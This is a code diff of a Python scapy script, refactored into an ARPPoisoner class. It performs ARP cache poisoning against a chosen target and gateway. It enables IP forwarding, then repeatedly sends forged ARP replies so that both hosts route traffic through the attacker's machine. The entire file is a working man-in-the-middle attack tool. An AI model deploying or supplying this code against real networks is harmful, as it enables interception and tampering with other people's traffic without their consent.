@@ -1,94 +1,106 @@
 from scapy.all import *
-from typing import List
 from dataclasses import dataclass
+from threading import Thread
+from sys import platform
 import time
 import os
 
 @dataclass
 class SpoofingInformation:
+    """Class that holds the spoofing information"""
     ip_gateway: str = None
     ip_target: str = None
     mac_gateway: str = None
     mac_target: str = None
 
-def get_ip_addresses_on_network() -> List[str]:
-    """TODO"""
-    pass
+class ARPPoisoner:
+    """
+    ARP Poisoner class
+    Creating:
+        interface is the interface scrapy needs to use
+        ip_target is the ip address of the target we want to attack
+        ip_gateway is the gateway between the source and the target
+    Starting:
+        Just call the start() method
+    Stopping:
+        Just call the stop() method. Calling this before start() does nothing.
+    """
+    def __init__(self, interface: str, ip_target: str, ip_gateway: str) -> None:
+        self.interface: str = interface
+        self.ip_target: str = ip_target
+        self.ip_gateway: str = ip_gateway
+        self.is_stopped: bool = False
+        self.thread: Thread = threading.Thread(target=self.spoof, args=(10,))
 
-def set_packet_forwarding(value: bool) -> None:
-    """TODO WINDOWS & Linux"""
-    if value:
-        os.system('sysctl -w net.inet.ip.forwarding=1')
-    else:
-        os.system('sysctl -w net.inet.ip.forwarding=0')
+    def start(self):
+        """Start the thread"""
+        self.thread.start()
 
-def get_mac_address(ip: str, interface: str) -> str:
-    """Broadcast a packet to all devices on the network to get the mac address corresponding to the ip address"""
-    arp_packet: Packet = Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(op = 1, pdst = ip)
-    response: str = srp(arp_packet, timeout=5, verbose=False, iface=interface)[0][0][1].hwsrc
-    return response
+    def stop(self):
+        """This function notifies that the spoof function needs to stop"""
+        self.is_stopped = True
 
-def get_spoof_packet(ip_target: str, mac_target: str, ip_spoof: str) -> Packet:
-    """Creates a ARP packet"""
-    # create packet, opcode = 2 since it needs to be a reply packet
-    # pdst = ip address where the packet needs to go
-    # hwdst = destination hardware address
-    # pssrc = source ip address (let the receiver think that it is coming from this ip address)
-    packet: Packet = ARP(op = 2, pdst = ip_target, hwdst = mac_target, psrc = ip_spoof)
-    return packet
+    def set_packet_forwarding(self, value: bool) -> None:
+        """This function turns on or turns off IP (packet) forwarding depending on the value given"""
+        if platform == 'linux' or platform == 'linux2':
+            os.system('sysctl -w net.ipv4.ip_forward={}'.format(int(value)))
+        elif platform == 'darwin':
+            os.system('sysctl -w net.inet.ip.forwarding={}'.format(int(value)))
+        elif platform == 'win32':
+            # TODO!!!!!
+            pass
+        else:
+            print("Cannot turn on IP forwarding automatically...")
 
-def reset(si: SpoofingInformation) -> None:
-    """Function that sends the correct information to the target and gateway, spoofing is over!"""
-    packet1: Packet = ARP(op = 2, pdst = si.ip_target, hwdst = 'ff:ff:ff:ff:ff:ff', psrc = si.ip_gateway, hwsrc = si.mac_gateway)
-    packet2: Packet = ARP(op = 2, pdst = si.ip_gateway, hwdst = 'ff:ff:ff:ff:ff:ff', psrc = si.ip_target, hwsrc = si.mac_target)
-    send(packet1, count=7, verbose=False)
-    send(packet2, count=7, verbose=False)
+    def get_mac_address(self, ip: str) -> str:
+        """Broadcast a packet to all devices on the network to get the mac address corresponding to the ip address"""
+        arp_packet: Packet = Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(op = 1, pdst = ip)
+        response: str = srp(arp_packet, timeout=5, verbose=False, iface=self.interface)[0][0][1].hwsrc
+        return response
 
-def spoof(ip_target: str, ip_gateway: str, do_infitely: bool, interface: str,  seconds_to_wait: int = 0) -> None:
-    """Spoof the target so that it thinks that this computer is the gateway, and spoof the gateway
-    so that it thinks that this computer is the target"""
+    def get_spoof_packet(self, ip_target: str, mac_target: str, ip_spoof: str) -> Packet:
+        """Creates a reply ARP packet"""
+        # create packet, opcode = 2 since it needs to be a reply packet
+        # pdst = ip address where the packet needs to go
+        # hwdst = destination hardware address
+        # pssrc = source ip address (let the receiver think that it is coming from this ip address)
+        packet: Packet = ARP(op = 2, pdst = ip_target, hwdst = mac_target, psrc = ip_spoof)
+        return packet
 
-    si: SpoofingInformation = SpoofingInformation(ip_gateway = ip_gateway, ip_target = ip_target)
-    # get the mac addresses of the target and the gateway
-    si.mac_target = get_mac_address(ip_target, interface)
-    si.mac_gateway = get_mac_address(ip_gateway, interface)
+    def reset(self, si: SpoofingInformation) -> None:
+        """Function that sends the correct information to the target and gateway, spoofing is over!"""
+        packet1: Packet = ARP(op = 2, pdst = si.ip_target, hwdst = 'ff:ff:ff:ff:ff:ff', psrc = si.ip_gateway, hwsrc = si.mac_gateway)
+        packet2: Packet = ARP(op = 2, pdst = si.ip_gateway, hwdst = 'ff:ff:ff:ff:ff:ff', psrc = si.ip_target, hwsrc = si.mac_target)
+        send(packet1, count=7, verbose=False)
+        send(packet2, count=7, verbose=False)
 
-    # create the ARP packets to spoof
-    packet_for_target: Packet = get_spoof_packet(si.ip_target, si.mac_target, si.ip_gateway)
-    packet_for_gateway: Packet = get_spoof_packet(si.ip_gateway, si.mac_gateway, si.ip_target)
+    def spoof(self, seconds_to_wait: int = 0) -> None:
+        """Spoof the target so that it thinks that this computer is the gateway, and spoof the gateway
+        so that it thinks that this computer is the target"""
 
-    # turn on packet forwarding
-    set_packet_forwarding(True)
+        si: SpoofingInformation = SpoofingInformation(ip_gateway = self.ip_gateway, ip_target = self.ip_target)
+        # get the mac addresses of the target and the gateway
+        si.mac_target = self.get_mac_address(self.ip_target)
+        si.mac_gateway = self.get_mac_address(self.ip_gateway)
 
-    if not do_infitely:
-        send(packet_for_target, verbose = False) # since it is a L2 packet
-        # turn of packet forwarding
-        set_packet_forwarding(False)
+        # create the ARP packets to spoof
+        packet_for_target: Packet = self.get_spoof_packet(si.ip_target, si.mac_target, si.ip_gateway)
+        packet_for_gateway: Packet = self.get_spoof_packet(si.ip_gateway, si.mac_gateway, si.ip_target)
 
-    else:
-        try:
-            while True:
-                # let the target think that this computer is the gateway
-                send(packet_for_target, verbose = False)
+        # turn on packet forwarding
+        self.set_packet_forwarding(True)
 
-                # let the gateway think that this computer is the garget
-                send(packet_for_gateway, verbose = False)
+        while not self.is_stopped:
+            # let the target think that this computer is the gateway
+            send(packet_for_target, verbose = False)
 
-                # wait for some seconds
-                time.sleep(seconds_to_wait)
-        except KeyboardInterrupt:
-            print("\nExit...")
-            reset(si)
-            
-            # turn off packet forwarding
-            set_packet_forwarding(False)
+            # let the gateway think that this computer is the garget
+            send(packet_for_gateway, verbose = False)
 
-if __name__ == '__main__':
-    #get_mac_address('192.168.200.34')
+            # wait for some seconds
+            time.sleep(seconds_to_wait)
 
-    #ip_target: str = '192.168.200.1'
-    ip_target: str = '192.168.200.1' # 19
-    #ip_target: str = '192.168.200.1'
-    ip_gateway: str = '192.168.200.254'
-    spoof(ip_target, ip_gateway, True, 10)
-    #reset(ip_target, gateway)
+
+        # turn off packet forwarding
+        self.set_packet_forwarding(False)
+        self.reset(si)
